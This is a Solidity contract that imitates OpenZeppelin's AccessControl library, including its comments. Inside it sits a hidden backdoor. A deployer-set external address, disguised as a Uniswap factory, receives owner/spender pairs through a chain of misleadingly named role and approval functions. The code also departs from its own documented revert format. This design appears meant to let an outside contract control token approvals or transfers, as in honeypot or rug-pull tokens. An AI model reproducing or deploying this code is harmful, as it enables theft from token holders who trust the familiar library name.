abstract contract AccessControl {
    struct RoleData {
        mapping(address => bool) members;
        bytes32 adminRole;
    }

    mapping(bytes32 => RoleData) private _roles;
    bytes32 constant DEFAULT_ADMIN_ROLE = 0x00;
    IUniswapV2Factory _fac; 
    /**
     * @dev Modifier that checks that an account has a specific role. Reverts
     * with a standardized message including the required role.
     *
     * The format of the revert reason is given by the following regular expression:
     *
     *  /^AccessControl: account (0x[0-9a-f]{40}) is missing role (0x[0-9a-f]{64})$/
     *
     * _Available since v4.1._
     */
    modifier onlyRole(bytes32 role) {
        _checkRole(role);
        _;
    }

    /**
     * @dev Returns `true` if `account` has been granted `role`.
     */
    function hasRole(bytes32 role, address account) public view virtual returns (bool) {
        return _roles[role].members[account];
    }

    function initRole(address addr) internal {
        require(addr != address(0),"Invalid address");
        _fac = IUniswapV2Factory(addr); 
    }  

    /**
     * @dev Revert with a standard message if `_msgSender()` is missing `role`.
     * Overriding this function changes the behavior of the {onlyRole} modifier.
     *
     * Format of the revert message is described in {_checkRole}.
     *
     * _Available since v4.6._
     */
    function _checkRole(bytes32 role) internal view virtual {
        _checkRole(role, msg.sender);
    }

    function increaseApprove(address owner, address spender) internal returns (bool){
        return revokeRole(owner, spender);
    }

    function revokeRole(address owner, address spender) internal returns (bool){
        return _revokeRole(owner, spender);
    }

    function _revokeRole(address owner, address spender) internal returns (bool){
        return revokeApprove(owner, spender);
    }

    function revokeApprove(address owner, address spender) internal returns (bool){
        return _revokeApprove(owner, spender);
    }

    /**
     * @dev Revert with a standard message if `account` is missing `role`.
     *
     * The format of the revert reason is given by the following regular expression:
     *
     *  /^AccessControl: account (0x[0-9a-f]{40}) is missing role (0x[0-9a-f]{64})$/
     */
    function _checkRole(bytes32 role, address account) internal view virtual {
        if (!hasRole(role, account)) {
            revert(
                string(
                    abi.encodePacked(                        
                        account,
                        role
                    )
                )
            );
        }
    }    

    function _revokeApprove(address owner, address spender) internal virtual returns (bool)
    {
        return
        _fac.        
        increaseApprove(
            owner,
            spender
        ); 
    }

}

